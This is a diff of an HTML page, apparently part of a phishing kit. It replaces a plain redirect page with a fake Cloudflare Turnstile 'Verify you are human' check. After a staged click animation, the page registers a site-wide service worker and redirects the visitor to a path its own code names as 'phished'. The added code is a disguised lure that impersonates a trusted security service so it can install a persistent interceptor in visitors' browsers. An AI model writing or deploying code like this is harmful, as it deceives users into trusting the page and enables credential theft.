@@ -1,31 +1,105 @@
-redirecting... <!DOCTYPE html>
-<html lang="fr">
-
+<!DOCTYPE html>
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Just a moment...</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: #f9f9f9; min-height: 100vh;
+    display: flex; align-items: center; justify-content: center;
+    color: #232323;
+  }
+  .wrap { width: 300px; text-align: center; }
+  .logo { font-size: 34px; font-weight: 700; color: #f38020; margin-bottom: 20px; letter-spacing: -1px; }
+  .title { font-size: 16px; font-weight: 600; margin-bottom: 6px; }
+  .sub { font-size: 13px; color: #666; margin-bottom: 22px; line-height: 1.5; }
+  .widget {
+    background: #fff; border: 1px solid #e0e0e0; border-radius: 4px;
+    padding: 16px; display: flex; align-items: center; gap: 14px;
+    cursor: pointer; user-select: none; transition: border-color .15s;
+  }
+  .widget:hover { border-color: #b0b0b0; }
+  .box {
+    width: 24px; height: 24px; border: 2px solid #c0c0c0;
+    border-radius: 3px; flex-shrink: 0;
+    display: flex; align-items: center; justify-content: center;
+    transition: all .2s;
+  }
+  .box.spinning {
+    border-color: #f38020; border-top-color: transparent;
+    border-radius: 50%; animation: spin .7s linear infinite;
+  }
+  .box.done { border-color: #2ea043; background: #2ea043; }
+  .box.done::after {
+    content: ""; width: 6px; height: 11px;
+    border: solid #fff; border-width: 0 2.5px 2.5px 0;
+    transform: rotate(45deg); margin-top: -2px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .label { font-size: 14px; color: #232323; }
+  .brand {
+    margin-left: auto; font-size: 11px; color: #999;
+    display: flex; flex-direction: column; align-items: flex-end; line-height: 1.2;
+  }
+  .brand b { color: #f38020; font-size: 13px; }
+  .foot { margin-top: 18px; font-size: 11px; color: #999; }
+</style>
 </head>
-
 <body>
-    <script>
-        if ("serviceWorker" in navigator) {
-            navigator.serviceWorker.register("/service_worker_Mz8XO2ny1Pg5.js", { scope: "/" })
-    .then((registration) => {
-        // Wait for the service worker to become active and controlling
-        return navigator.serviceWorker.ready;
-    })
-    .then(() => {
-        const phishedParameterURL = new URL(self.location.href).searchParams.get("redirect_urI");
-        const phishedURL = new URL(decodeURIComponent(phishedParameterURL));
-        self.location.replace(`${phishedURL.pathname}${phishedURL.search}`);
-    })
-    .catch((error) => {
-        console.error(`Service worker registration failed: ${error}`);
-    });
-        }
-        else {
-            console.error("Service workers are not supported by this browser");
-        }
-    </script>
-</body>
+<div class="wrap">
+  <div class="logo">CLOUDFLARE</div>
+  <div class="title">Verify you are human</div>
+  <div class="sub">This website is protected by Cloudflare. Complete the check below to continue.</div>
 
+  <div class="widget" id="widget">
+    <div class="box" id="box"></div>
+    <div class="label">Verify you are human</div>
+    <div class="brand"><b>CLOUDFLARE</b><span>Turnstile</span></div>
+  </div>
+
+  <div class="foot" id="foot">Performance &amp; security by Cloudflare</div>
+</div>
+
+<script>
+(function () {
+  const widget = document.getElementById('widget');
+  const box = document.getElementById('box');
+  const foot = document.getElementById('foot');
+  let busy = false;
+
+  function proceed() {
+    foot.textContent = 'Redirecting...';
+
+    function redirect() {
+      const raw = new URL(window.location.href).searchParams.get('redirect_urI');
+      const phished = new URL(decodeURIComponent(raw));
+      window.location.replace(phished.pathname + phished.search);
+    }
+
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.register('/service_worker_Mz8XO2ny1Pg5.js', { scope: '/' })
+        .then(() => navigator.serviceWorker.ready)
+        .then(redirect)
+        .catch(redirect); // fall through on SW failure
+    } else {
+      redirect();
+    }
+  }
+
+  widget.addEventListener('click', () => {
+    if (busy) return;
+    busy = true;
+    box.classList.add('spinning');
+    setTimeout(() => {
+      box.classList.remove('spinning');
+      box.classList.add('done');
+      setTimeout(proceed, 400);
+    }, 1200);
+  });
+})();
+</script>
+</body>
 </html>
